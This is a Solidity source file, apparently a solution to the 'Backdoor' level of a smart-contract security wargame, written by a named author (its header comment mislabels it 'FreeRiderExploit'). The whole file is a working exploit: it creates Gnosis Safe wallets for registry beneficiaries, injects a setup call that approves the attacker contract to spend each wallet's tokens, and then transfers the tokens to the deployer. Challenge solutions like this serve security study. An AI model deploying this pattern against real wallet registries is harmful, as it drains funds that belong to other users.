// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../backdoor/WalletRegistry.sol";
import "hardhat/console.sol";
/**
 * @title FreeRiderExploit
 * @author Jasmine Abtahi
 */

contract Approve {
    function callBack(IERC20 _token, address attacker, uint256 amount) external {
        _token.approve(attacker, amount);

    }
}
contract BackdoorExploit {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    WalletRegistry registry;
    address public immutable masterCopy;
    GnosisSafeProxyFactory public immutable walletFactory;
    IERC20 public immutable token;
    Approve public immutable approve;
    constructor(address _registry, address[] memory beneficiaries) {
        registry = WalletRegistry(_registry);
        masterCopy = registry.masterCopy();
        walletFactory = GnosisSafeProxyFactory(registry.walletFactory());
        token = registry.token();
        approve = new Approve();
        attack(beneficiaries, msg.sender);
    }
    
    function attack(address[] memory users, address receipent) internal {
        bytes memory initializer; 
        address[] memory owners = new address[](1);
        address proxy;
        bytes memory data = abi.encodeCall(approve.callBack, (token, address(this), PAYMENT_AMOUNT));
       
        for(uint i = 0; i < users.length; i++) {
            owners[0] = users[i];

            initializer = abi.encodeCall(
                GnosisSafe.setup, (
                    owners,
                    EXPECTED_THRESHOLD,
                    address(approve),
                    data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            proxy = address(walletFactory.createProxyWithCallback(
                masterCopy,
                initializer,
                0,
                IProxyCreationCallback(registry)
            ));

            token.transferFrom(proxy, receipent, PAYMENT_AMOUNT);
        }
    }

    // function callBack(IERC20 _token, address attacker, uint256 amount) external {
    //     _token.approve(attacker, amount);
    // }
    receive() external payable {}
}
